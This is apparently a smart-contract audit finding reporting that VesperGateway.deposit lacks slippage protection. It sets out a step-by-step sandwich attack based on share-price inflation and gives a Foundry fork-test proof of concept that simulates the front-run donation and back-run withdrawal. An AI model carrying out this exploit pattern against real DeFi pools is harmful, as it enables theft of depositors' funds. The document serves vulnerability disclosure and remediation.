### Title
VesperGateway.deposit lacks slippage protection on external vToken mint — attacker can sandwich via share-price inflation so the depositor mints far fewer msdTokens — ([File: contracts/VesperGateway.sol](contracts/VesperGateway.sol))

### Summary
`VesperGateway.deposit` takes user-supplied underlying, calls `vToken_.deposit(amount_)` on an external Vesper pool, and blindly forwards whatever vToken balance delta it receives into `DepositToken.deposit`, which mints msdTokens ~1:1 with the vTokens received. There is no `minVTokenOut`/`minShares` parameter. The vToken mint amount is entirely determined by the Vesper pool's internal exchange rate (`amount * totalSupply / totalValue`), which an unprivileged attacker can inflate in the same block by holding a large vToken position and donating underlying directly to the pool — the exact same share-price-manipulation class as the reported `buyShares` sandwich.

### Finding Description
In `VesperGateway.deposit` (contracts/VesperGateway.sol:44-65):

```solidity
_underlying.safeTransferFrom(_msgSender, address(this), amount_);
_underlying.safeApprove(address(vToken_), 0);
_underlying.safeApprove(address(vToken_), amount_);
uint256 _balanceBefore = vToken_.balanceOf(address(this));
vToken_.deposit(amount_);                                  // no min-out check
uint256 _vTokenAmount = vToken_.balanceOf(address(this)) - _balanceBefore;

IDepositToken _depositToken = pool_.depositTokenOf(vToken_);
vToken_.safeApprove(address(_depositToken), _vTokenAmount);
_depositToken.deposit(_vTokenAmount, _msgSender);
```

`DepositToken.deposit` mints `amount - fee` msdTokens with no exchange-rate logic — the minted amount equals whatever `_vTokenAmount` the gateway measured (contracts/DepositToken.sol:225-236). So all slippage risk is concentrated in `vToken_.deposit(amount_)`, whose output depends on the Vesper pool's price-per-share at execution time.

Attack path (all unprivileged):

1. Attacker holds a large vToken position in the target VPool (or is the dominant LP).
2. Victim submits `VesperGateway.deposit(pool, vToken, X)`.
3. Front-run: attacker transfers underlying directly to the VPool's token accounting surface (donation) and/or executes a large deposit so that `totalValue` is inflated relative to `totalSupply`, raising price-per-share.
4. Victim's `vToken_.deposit(X)` mints `X * totalSupply / inflatedTotalValue` — far fewer vTokens. The gateway mints only that many msdTokens to the victim.
5. Back-run: attacker redeems/withdraws; the donated value is shared pro-rata across all vToken holders, so the attacker (dominant holder) recaptures most of the donation plus the value the victim effectively paid in.

The victim's loss is real: they hold msdTokens that, when withdrawn via `VesperGateway.withdraw` (lines 73-93), redeem vTokens at the now-normalized price — recovering only a fraction of the underlying they put in. The protocol's `depositTokenOf(vToken_)` lookup (line 61) ties the minted collateral to the real registered pool, so the loss is borne by the user, not masked by fake tokens.

### Impact Explanation
Direct theft of user funds: a depositor through `VesperGateway` can lose an attacker-controlled fraction (up to nearly all, on thin pools) of their deposited underlying, with the profit accruing to the attacker as the dominant vToken holder. Same invariant break as the reference finding: shares are minted at a manipulated ratio with no slippage bound.

### Likelihood Explanation
- Requires only public entry points: victim's `VesperGateway.deposit` in the mempool, attacker's vToken holdings and a direct underlying transfer to the Vesper pool. No privileged role needed; `onlyGovernor` only guards `sweep`.
- Profitability depends on the specific VPool's TVL and share distribution — on a deep pool the attacker must be a very large holder, but Vesper pools routinely have concentrated LP positions, and the attack is strongest right after a new collateral listing when the pool is thin. Even in deep pools the victim has zero protection: any realized slippage between quote and execution is silently absorbed.
- No existing mitigation: `deposit` is not `nonReentrant`, there is no deadline/min-out, and `DepositToken.deposit` only checks `maxTotalSupply` and pause/active flags.

### Recommendation
Add a `minVTokenAmount_` (or `minSharesOut`) parameter to `VesperGateway.deposit` and revert if `vToken_.balanceOf(address(this)) - _balanceBefore < minVTokenAmount_`. Optionally also bound `deposit` with a `deadline_` parameter.

### Proof of Concept
Reproducible as a Foundry fork test against a deployed Vesper pool registered as collateral in a Metronome pool:

```solidity
// Fork mainnet; vesperPool = e.g. vUSDC-style IVPool registered in `pool`.
// attacker holds a large vToken balance (whale or flash-deposited earlier).
function test_sandwich_vesperGatewayDeposit() public {
    uint256 victimAmount = 1_000_000e6; // underlying units

    // --- baseline: fair deposit ---
    uint256 sharesFair = quoteVTokenShares(victimAmount); // vToken.deposit math at current pps

    // --- attacker front-run ---
    vm.startPrank(attacker);
    // donate underlying directly to the pool to inflate totalValue
    uint256 donation = 9 * victimAmount;
    underlying.transfer(address(vesperPool), donation); // pps ~10x
    vm.stopPrank();

    // --- victim deposit through gateway ---
    vm.startPrank(victim);
    underlying.approve(address(vesperGateway), victimAmount);
    vesperGateway.deposit(pool, vesperPool, victimAmount);
    vm.stopPrank();

    uint256 victimMsd = depositToken.balanceOf(victim);   // == vTokens received
    assertLt(victimMsd, sharesFair / 8);                  // victim minted << expected

    // --- attacker back-run: redeem vTokens, recapturing donation + victim's loss ---
    vm.startPrank(attacker);
    vesperPool.withdraw(vesperPool.balanceOf(attacker));
    assertGt(underlying.balanceOf(attacker), attackerStart + donation * 9 / 10);
    vm.stopPrank();
}
```

On a fork, `vToken_.deposit` uses the live VPool implementation (share mint = `amount_ * totalSupply / totalValue()`), so the donation-driven inflation and reduced mint are exercised against real code rather than a mock.
